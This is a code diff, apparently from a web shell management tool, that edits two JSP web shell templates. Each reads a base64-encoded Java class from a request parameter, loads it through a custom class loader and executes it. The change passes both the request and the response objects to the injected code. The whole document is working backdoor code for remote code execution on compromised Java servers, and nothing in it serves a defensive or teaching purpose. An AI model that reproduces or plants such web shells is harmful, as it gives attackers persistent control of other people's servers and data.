@@ -57,7 +57,7 @@ class Core {
   <jsp:scriptlet>
     String cls = request.getParameter("ASPWD");
     if (cls != null) {
-      new PCLASSNAME(this.getClass().getClassLoader()).SCLASSNAME(B64FUNCNAME(cls)).newInstance().equals(request);
+      new PCLASSNAME(this.getClass().getClassLoader()).SCLASSNAME(B64FUNCNAME(cls)).newInstance().equals(new Object[]{request,response});
     }
   </jsp:scriptlet>
 </jsp:root>`;
@@ -97,7 +97,7 @@ public byte[] B64FUNCNAME(String str) throws Exception {
 <%
 String cls = request.getParameter("ASPWD");
 if (cls != null) {
-  new PCLASSNAME(this.getClass().getClassLoader()).SCLASSNAME(B64FUNCNAME(cls)).newInstance().equals(request);
+  new PCLASSNAME(this.getClass().getClassLoader()).SCLASSNAME(B64FUNCNAME(cls)).newInstance().equals(new Object[]{request,response});
 }
 %>
 `;
